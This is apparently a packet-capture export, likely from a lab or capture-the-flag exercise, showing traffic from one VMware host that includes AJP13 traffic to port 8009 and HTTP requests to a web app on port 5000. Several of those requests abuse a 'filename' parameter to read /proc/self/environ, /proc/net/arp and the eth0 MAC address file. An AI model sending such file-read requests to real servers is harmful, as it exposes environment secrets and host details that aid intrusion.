"No.","Time","Source","Destination","Protocol","Length","Info","src_mac"
"1258","2023-10-21 13:48:24.087960936","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=40378 Win=60672 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
"1260","2023-10-21 13:48:24.088238387","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=41330 Win=64128 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
"1262","2023-10-21 13:48:24.088397672","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=48570 Win=60672 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
"1263","2023-10-21 13:48:24.088443380","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=49522 Win=59776 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
"1267","2023-10-21 13:48:24.088910364","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=57714 Win=80512 Len=0 TSval=2341540163 TSecr=1741520373","VMware_65:77:ad"
"1269","2023-10-21 13:48:24.088910454","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=64954 Win=94976 Len=0 TSval=2341540163 TSecr=1741520373","VMware_65:77:ad"
"1270","2023-10-21 13:48:24.089046945","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=67850 Win=100864 Len=0 TSval=2341540163 TSecr=1741520373","VMware_65:77:ad"
"1272","2023-10-21 13:48:24.089214005","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=68813 Win=103680 Len=0 TSval=2341540163 TSecr=1741520373","VMware_65:77:ad"
"1273","2023-10-21 13:48:24.091602707","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [FIN, ACK] Seq=399 Ack=68814 Win=103680 Len=0 TSval=2341540165 TSecr=1741520373","VMware_65:77:ad"
"1275","2023-10-21 13:48:24.216414015","192.168.1.227","192.168.1.254","DNS","77","Standard query 0xad68 A fonts.gstatic.com","VMware_65:77:ad"
"1276","2023-10-21 13:48:24.216414656","192.168.1.227","192.168.1.254","DNS","77","Standard query 0x746d AAAA fonts.gstatic.com","VMware_65:77:ad"
"1279","2023-10-21 13:48:24.231922237","192.168.1.227","142.251.10.94","TCP","74","49592  >  443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=831660084 TSecr=0 WS=128","VMware_65:77:ad"
"1281","2023-10-21 13:48:24.235155359","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=831660088 TSecr=4285554289","VMware_65:77:ad"
"1282","2023-10-21 13:48:24.242076485","192.168.1.227","142.251.10.94","TLSv1.3","1131","Client Hello","VMware_65:77:ad"
"1285","2023-10-21 13:48:24.245635778","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1066 Ack=197 Win=64128 Len=0 TSval=831660099 TSecr=4285554300","VMware_65:77:ad"
"1286","2023-10-21 13:48:24.249713512","192.168.1.227","142.251.10.94","TLSv1.3","156","Application Data","VMware_65:77:ad"
"1287","2023-10-21 13:48:24.250444009","192.168.1.227","142.251.10.94","TLSv1.3","128","Application Data","VMware_65:77:ad"
"1288","2023-10-21 13:48:24.250579831","192.168.1.227","142.251.10.94","TLSv1.3","137","Application Data","VMware_65:77:ad"
"1289","2023-10-21 13:48:24.250635638","192.168.1.227","142.251.10.94","TLSv1.3","117","Application Data","VMware_65:77:ad"
"1290","2023-10-21 13:48:24.251636284","192.168.1.227","142.251.10.94","TLSv1.3","495","Application Data","VMware_65:77:ad"
"1294","2023-10-21 13:48:24.253203935","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1769 Ack=876 Win=64128 Len=0 TSval=831660106 TSecr=4285554307","VMware_65:77:ad"
"1295","2023-10-21 13:48:24.253766795","192.168.1.227","142.251.10.94","TLSv1.3","113","Application Data","VMware_65:77:ad"
"1305","2023-10-21 13:48:24.256471696","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1816 Ack=18219 Win=52096 Len=0 TSval=831660109 TSecr=4285554310","VMware_65:77:ad"
"1308","2023-10-21 13:48:24.258425745","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1816 Ack=19494 Win=64128 Len=0 TSval=831660111 TSecr=4285554311","VMware_65:77:ad"
"1309","2023-10-21 13:48:24.259224578","192.168.1.227","142.251.10.94","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1317","2023-10-21 13:48:24.544675047","192.168.1.227","192.168.1.183","TCP","74","52730  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341540618 TSecr=0 WS=128","VMware_65:77:ad"
"1319","2023-10-21 13:48:24.545343697","192.168.1.227","192.168.1.183","TCP","66","52730  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341540619 TSecr=1741520829","VMware_65:77:ad"
"1320","2023-10-21 13:48:24.545704649","192.168.1.227","192.168.1.183","HTTP","446","GET /favicon.ico HTTP/1.1 ","VMware_65:77:ad"
"1324","2023-10-21 13:48:24.555059996","192.168.1.227","192.168.1.183","TCP","66","52730  >  5000 [ACK] Seq=381 Ack=182 Win=64128 Len=0 TSval=2341540629 TSecr=1741520839","VMware_65:77:ad"
"1325","2023-10-21 13:48:24.555579158","192.168.1.227","192.168.1.183","TCP","66","52730  >  5000 [FIN, ACK] Seq=381 Ack=390 Win=64128 Len=0 TSval=2341540629 TSecr=1741520839","VMware_65:77:ad"
"1382","2023-10-21 13:48:27.293959780","192.168.1.227","192.168.1.1","AJP13","176","AJP13 Error? [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1384","2023-10-21 13:48:27.299447972","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=881 Ack=881 Win=501 Len=0 TSval=2919194068 TSecr=1841285666","VMware_65:77:ad"
"1388","2023-10-21 13:48:27.479367041","192.168.1.227","192.168.1.183","TCP","74","51956  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341543553 TSecr=0 WS=128","VMware_65:77:ad"
"1390","2023-10-21 13:48:27.479960618","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341543554 TSecr=1741523764","VMware_65:77:ad"
"1391","2023-10-21 13:48:27.480134722","192.168.1.227","192.168.1.183","HTTP","577","GET /api?filename=static/images/coffeeshop.jpg HTTP/1.1 ","VMware_65:77:ad"
"1397","2023-10-21 13:48:27.490500675","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=177 Win=64128 Len=0 TSval=2341543564 TSecr=1741523774","VMware_65:77:ad"
"1398","2023-10-21 13:48:27.490500795","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=7417 Win=60032 Len=0 TSval=2341543564 TSecr=1741523774","VMware_65:77:ad"
"1399","2023-10-21 13:48:27.490561211","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=13209 Win=56064 Len=0 TSval=2341543564 TSecr=1741523774","VMware_65:77:ad"
"1402","2023-10-21 13:48:27.491102638","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=27689 Win=46976 Len=0 TSval=2341543565 TSecr=1741523775","VMware_65:77:ad"
"1405","2023-10-21 13:48:27.491355873","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=42169 Win=37248 Len=0 TSval=2341543565 TSecr=1741523775","VMware_65:77:ad"
"1406","2023-10-21 13:48:27.491409295","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=45065 Win=35200 Len=0 TSval=2341543565 TSecr=1741523775","VMware_65:77:ad"
"1408","2023-10-21 13:48:27.491786623","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=66629 Win=25472 Len=0 TSval=2341543566 TSecr=1741523775","VMware_65:77:ad"
"1409","2023-10-21 13:48:27.494231797","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [FIN, ACK] Seq=512 Ack=66629 Win=64128 Len=0 TSval=2341543568 TSecr=1741523775","VMware_65:77:ad"
"1527","2023-10-21 13:48:32.300689853","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=881 Ack=881 Win=501 Len=110 TSval=2919199069 TSecr=1841285666 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1529","2023-10-21 13:48:32.303407358","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=991 Ack=991 Win=501 Len=0 TSval=2919199072 TSecr=1841290670","VMware_65:77:ad"
"1547","2023-10-21 13:48:33.826109131","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"1560","2023-10-21 13:48:34.829211471","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"1589","2023-10-21 13:48:35.829393017","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"1604","2023-10-21 13:48:36.839215669","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"1615","2023-10-21 13:48:37.310499394","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=991 Ack=991 Win=501 Len=110 TSval=2919204078 TSecr=1841290670 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1617","2023-10-21 13:48:37.312387300","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1101 Ack=1101 Win=501 Len=0 TSval=2919204081 TSecr=1841295679","VMware_65:77:ad"
"1638","2023-10-21 13:48:38.089777873","192.168.1.227","142.251.10.94","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1639","2023-10-21 13:48:38.089976484","192.168.1.227","192.229.179.87","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1640","2023-10-21 13:48:38.090619675","192.168.1.227","142.251.10.94","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1641","2023-10-21 13:48:38.090766650","192.168.1.227","142.251.10.94","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1647","2023-10-21 13:48:38.093586598","192.168.1.227","74.125.200.95","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1649","2023-10-21 13:48:38.093649208","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=2007 Ack=19495 Win=64128 Len=0 TSval=831673946 TSecr=4285568148","VMware_65:77:ad"
"1650","2023-10-21 13:48:38.093955357","192.168.1.227","74.125.200.95","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1651","2023-10-21 13:48:38.094062282","192.168.1.227","74.125.200.95","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1652","2023-10-21 13:48:38.094557070","192.168.1.227","192.229.179.87","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1653","2023-10-21 13:48:38.094879584","192.168.1.227","192.229.179.87","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1654","2023-10-21 13:48:38.095208634","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [FIN, ACK] Seq=1792 Ack=10309 Win=64128 Len=0 TSval=3909231585 TSecr=1197406931","VMware_65:77:ad"
"1658","2023-10-21 13:48:38.097229906","192.168.1.227","74.125.200.95","TCP","66","53016  >  443 [ACK] Seq=1946 Ack=2364 Win=64128 Len=0 TSval=2027215923 TSecr=3154230308","VMware_65:77:ad"
"1752","2023-10-21 13:48:42.318702869","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1101 Ack=1101 Win=501 Len=110 TSval=2919209087 TSecr=1841295679 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1754","2023-10-21 13:48:42.322711256","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1211 Ack=1211 Win=501 Len=0 TSval=2919209091 TSecr=1841300688","VMware_65:77:ad"
"1875","2023-10-21 13:48:46.947330539","192.168.1.227","192.168.1.183","TCP","74","52082  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341563020 TSecr=0 WS=128","VMware_65:77:ad"
"1877","2023-10-21 13:48:46.947968731","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341563021 TSecr=1741543232","VMware_65:77:ad"
"1878","2023-10-21 13:48:46.948404986","192.168.1.227","192.168.1.183","HTTP","530","GET /api?filename=/proc/self/environ HTTP/1.1 ","VMware_65:77:ad"
"1882","2023-10-21 13:48:46.950710816","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [ACK] Seq=465 Ack=176 Win=64128 Len=0 TSval=2341563024 TSecr=1741543234","VMware_65:77:ad"
"1885","2023-10-21 13:48:46.950858529","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [ACK] Seq=465 Ack=3072 Win=63488 Len=0 TSval=2341563024 TSecr=1741543235","VMware_65:77:ad"
"1886","2023-10-21 13:48:46.950858599","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [ACK] Seq=465 Ack=3621 Win=62976 Len=0 TSval=2341563024 TSecr=1741543235","VMware_65:77:ad"
"1887","2023-10-21 13:48:46.951448898","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [FIN, ACK] Seq=465 Ack=3622 Win=64128 Len=0 TSval=2341563025 TSecr=1741543235","VMware_65:77:ad"
"1909","2023-10-21 13:48:47.325221798","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1211 Ack=1211 Win=501 Len=110 TSval=2919214093 TSecr=1841300688 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1911","2023-10-21 13:48:47.339633196","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1321 Ack=1321 Win=501 Len=0 TSval=2919214108 TSecr=1841305705","VMware_65:77:ad"
"1968","2023-10-21 13:48:50.281099679","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"2032","2023-10-21 13:48:52.341809691","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1321 Ack=1321 Win=501 Len=110 TSval=2919219110 TSecr=1841305705 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2034","2023-10-21 13:48:52.359745880","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1431 Ack=1431 Win=501 Len=0 TSval=2919219128 TSecr=1841310726","VMware_65:77:ad"
"2125","2023-10-21 13:48:56.758113327","192.168.1.227","192.168.1.183","TCP","74","45034  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341572831 TSecr=0 WS=128","VMware_65:77:ad"
"2127","2023-10-21 13:48:56.758585625","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341572832 TSecr=1741553043","VMware_65:77:ad"
"2128","2023-10-21 13:48:56.758909301","192.168.1.227","192.168.1.183","HTTP","502","GET /api HTTP/1.1 ","VMware_65:77:ad"
"2132","2023-10-21 13:48:56.800741889","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=437 Ack=196 Win=64128 Len=0 TSval=2341572874 TSecr=1741553084","VMware_65:77:ad"
"2134","2023-10-21 13:48:56.800996262","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=437 Ack=7436 Win=60672 Len=0 TSval=2341572874 TSecr=1741553085","VMware_65:77:ad"
"2136","2023-10-21 13:48:56.801126131","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=437 Ack=13228 Win=61568 Len=0 TSval=2341572874 TSecr=1741553085","VMware_65:77:ad"
"2137","2023-10-21 13:48:56.801203549","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=437 Ack=16683 Win=58624 Len=0 TSval=2341572874 TSecr=1741553085","VMware_65:77:ad"
"2139","2023-10-21 13:48:56.802900261","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [FIN, ACK] Seq=437 Ack=16684 Win=64128 Len=0 TSval=2341572876 TSecr=1741553086","VMware_65:77:ad"
"2143","2023-10-21 13:48:57.366841035","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1431 Ack=1431 Win=501 Len=110 TSval=2919224135 TSecr=1841310726 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2145","2023-10-21 13:48:57.385174325","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1541 Ack=1541 Win=501 Len=0 TSval=2919224153 TSecr=1841315750","VMware_65:77:ad"
"2663","2023-10-21 13:49:02.390333082","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1541 Ack=1541 Win=501 Len=110 TSval=2919229158 TSecr=1841315750 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2665","2023-10-21 13:49:02.396135151","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1651 Ack=1651 Win=501 Len=0 TSval=2919229164 TSecr=1841320762","VMware_65:77:ad"
"2771","2023-10-21 13:49:07.398965538","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1651 Ack=1651 Win=501 Len=110 TSval=2919234167 TSecr=1841320762 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2773","2023-10-21 13:49:07.410973947","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1761 Ack=1761 Win=501 Len=0 TSval=2919234179 TSecr=1841325776","VMware_65:77:ad"
"2802","2023-10-21 13:49:08.632064005","192.168.1.227","192.168.1.183","TCP","74","59330  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341584705 TSecr=0 WS=128","VMware_65:77:ad"
"2804","2023-10-21 13:49:08.632791749","192.168.1.227","192.168.1.183","TCP","66","59330  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341584706 TSecr=1741564917","VMware_65:77:ad"
"2805","2023-10-21 13:49:08.632974088","192.168.1.227","192.168.1.183","HTTP","525","GET /api?filename=/proc/net/arp HTTP/1.1 ","VMware_65:77:ad"
"2809","2023-10-21 13:49:08.635048071","192.168.1.227","192.168.1.183","TCP","66","59330  >  5000 [ACK] Seq=460 Ack=175 Win=64128 Len=0 TSval=2341584708 TSecr=1741564919","VMware_65:77:ad"
"2810","2023-10-21 13:49:08.635718503","192.168.1.227","192.168.1.183","TCP","66","59330  >  5000 [FIN, ACK] Seq=460 Ack=399 Win=64128 Len=0 TSval=2341584709 TSecr=1741564919","VMware_65:77:ad"
"2884","2023-10-21 13:49:12.414484220","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1761 Ack=1761 Win=501 Len=110 TSval=2919239183 TSecr=1841325776 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2886","2023-10-21 13:49:12.430167681","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1871 Ack=1871 Win=501 Len=0 TSval=2919239198 TSecr=1841330796","VMware_65:77:ad"
"2980","2023-10-21 13:49:17.438000256","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1871 Ack=1871 Win=501 Len=110 TSval=2919244206 TSecr=1841330796 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2984","2023-10-21 13:49:17.447518843","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1981 Ack=1981 Win=501 Len=0 TSval=2919244216 TSecr=1841335813","VMware_65:77:ad"
"2994","2023-10-21 13:49:18.455918121","192.168.1.227","192.168.1.183","TCP","74","57994  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341594529 TSecr=0 WS=128","VMware_65:77:ad"
"2996","2023-10-21 13:49:18.456348636","192.168.1.227","192.168.1.183","TCP","66","57994  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341594530 TSecr=1741574740","VMware_65:77:ad"
"2997","2023-10-21 13:49:18.456557035","192.168.1.227","192.168.1.183","HTTP","539","GET /api?filename=/sys/class/net/eth0/address HTTP/1.1 ","VMware_65:77:ad"
"3001","2023-10-21 13:49:18.458917348","192.168.1.227","192.168.1.183","TCP","66","57994  >  5000 [ACK] Seq=474 Ack=174 Win=64128 Len=0 TSval=2341594532 TSecr=1741574743","VMware_65:77:ad"
"3002","2023-10-21 13:49:18.459246133","192.168.1.227","192.168.1.183","TCP","66","57994  >  5000 [FIN, ACK] Seq=474 Ack=260 Win=64128 Len=0 TSval=2341594532 TSecr=1741574743","VMware_65:77:ad"
"3072","2023-10-21 13:49:22.454019987","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1981 Ack=1981 Win=501 Len=110 TSval=2919249222 TSecr=1841335813 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3075","2023-10-21 13:49:22.464477576","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2091 Ack=2091 Win=501 Len=0 TSval=2919249233 TSecr=1841340830","VMware_65:77:ad"
"3076","2023-10-21 13:49:22.475188293","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"3388","2023-10-21 13:49:27.470807887","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2091 Ack=2091 Win=501 Len=110 TSval=2919254238 TSecr=1841340830 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3393","2023-10-21 13:49:27.486158073","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2201 Ack=2201 Win=501 Len=0 TSval=2919254254 TSecr=1841345847","VMware_65:77:ad"
